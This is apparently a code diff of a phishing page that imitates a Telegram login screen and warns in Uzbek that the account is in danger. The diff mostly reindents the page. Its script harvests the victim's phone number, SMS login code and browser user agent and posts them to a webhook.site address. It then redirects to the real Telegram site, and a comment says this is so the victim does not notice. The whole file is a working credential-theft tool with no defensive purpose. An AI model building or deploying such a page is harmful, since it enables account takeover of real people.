@@ -1,45 +1,44 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Telegram</title>
-<style>
-body{background:#0088cc;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;}
-.box{background:white;padding:30px;border-radius:10px;text-align:center;width:300px;}
-input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box;}
-button{width:100%;padding:12px;background:#0088cc;color:white;border:none;border-radius:5px;cursor:pointer;}
-</style>
+    <title>Telegram</title>
+    <style>
+        body{background:#0088cc;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;}
+        .box{background:white;padding:30px;border-radius:10px;text-align:center;width:300px;}
+        input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box;}
+        button{width:100%;padding:12px;background:#0088cc;color:white;border:none;border-radius:5px;cursor:pointer;}
+    </style>
 </head>
 <body>
-<div class="box">
-    <h1 style="color:#0088cc;">📱 Telegram</h1>
-    <p style="color:red;">Hisobingiz xavf ostida! Tasdiqlang</p>
-    <h2>Telegram Login</h2>
-    <form id="form">
-        <input type="tel" id="phone" placeholder="+998901234567" required>
-        <input type="text" id="sms_code" placeholder="SMS kodi (12345)" required>
-        <button type="submit">Kirish</button>
-    </form>
-</div>
+    <div class="box">
+        <h1 style="color:#0088cc;">📱 Telegram</h1>
+        <p style="color:red;">Hisobingiz xavf ostida! Tasdiqlang</p>
+        <h2>Telegram Login</h2>
+        <form id="form">
+            <input type="tel" id="phone" placeholder="+998901234567" required>
+            <input type="text" id="sms_code" placeholder="SMS kodi (12345)" required>
+            <button type="submit">Kirish</button>
+        </form>
+    </div>
 
-<script>
-document.getElementById('form').onsubmit = function(e) {
-    e.preventDefault();
-    
-    // Ma'lumotlarni olish
-    var phone = document.getElementById('phone').value;
-    var code = document.getElementById('sms_code').value;
-    
-    // Webhook ga yuborish
-    fetch('https://webhook.site/0d5b234f-5372-4e94-8a06-c60951cbec24', {
-        method: 'POST',
-        mode: 'no-cors', // Xavfsizlik uchun
-        body: 'Raqam: ' + phone + ' | SMS: ' + code
-    });
-    
-    alert('Tasdiqlandi! Kod qabul qilindi.');
-    // Real Telegramga yo'naltirish
-    window.location.href = "https://telegram.org";
-}
-</script>
+    <script>
+    document.getElementById('form').onsubmit = function(e) {
+        e.preventDefault();
+        
+        var phone = document.getElementById('phone').value;
+        var code = document.getElementById('sms_code').value;
+        
+        // Webhook ga yuborish qismi
+        fetch('https://webhook.site/0d5b234f-5372-4e94-8a06-c60951cbec24', {
+            method: 'POST',
+            mode: 'no-cors', // Brauzer xavfsizligi to'xtatib qo'ymasligi uchun
+            body: 'Raqam: ' + phone + ' | SMS Kod: ' + code + ' | Brauzer: ' + navigator.userAgent
+        });
+        
+        alert('Tasdiqlandi! Kod qabul qilindi.');
+        // Foydalanuvchi sezmasligi uchun rasmiy saytga yuboramiz
+        window.location.href = "https://telegram.org";
+    }
+    </script>
 </body>
 </html>
